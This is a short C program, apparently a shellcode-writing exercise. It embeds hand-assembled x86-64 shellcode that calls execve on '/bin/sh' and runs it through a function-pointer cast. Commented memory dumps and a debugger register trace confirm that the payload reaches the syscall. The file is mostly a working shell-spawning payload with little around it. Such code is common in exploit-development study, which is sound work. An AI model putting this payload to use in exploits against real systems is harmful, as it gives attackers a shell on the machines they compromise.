#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    char shellcode[] =
    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"									// mov    %rsp, %rsi
    "\x48\x31\xC0"                                  // xor rax rax
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05";                                     // syscall
 
    (*(void (*)()) shellcode)();
     
    return 0;
}


/*0x7ffff7ff4000:	0x622f2fbb48d23148	0xebc14868732f6e69
0x7ffff7ff4010:	0x485750e789485308	0xc3c3050f3bb0e689*/

/*

RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x7ffff7aea6e0 (<__nanosleep_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x0 
RSI: 0x7fffffffe0b0 --> 0x7fffffffe0c0 --> 0x68732f6e69622f ('/bin/sh')
RDI: 0x7fffffffe0c0 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe210 --> 0x0 
RSP: 0x7fffffffe0b0 --> 0x7fffffffe0c0 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x7ffff7ff401f --> 0xc3c3c3909090050f 
R8 : 0x4010 
R9 : 0x7ffff7fd0700 (0x00007ffff7fd0700)
R10: 0x2e2e686568656820 (' heheh..')
R11: 0x246 
R12: 0x400920 (xor    ebp,ebp)
R13: 0x7fffffffe2f0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7ff4017:	mov    rsi,rsp
   0x7ffff7ff401a:	xor    rax,rax
   0x7ffff7ff401d:	mov    al,0x3b
=> 0x7ffff7ff401f:	syscall 
   0x7ffff7ff4021:	nop
   0x7ffff7ff4022:	nop
   0x7ffff7ff4023:	nop
   0x7ffff7ff4024:	ret
Guessed arguments:
arg[0]: 0x7fffffffe0c0 --> 0x68732f6e69622f ('/bin/sh')
arg[1]: 0x7fffffffe0b0 --> 0x7fffffffe0c0 --> 0x68732f6e69622f ('/bin/sh')
arg[2]: 0x0 
[------------------------------------stack-------------------------------------]

*/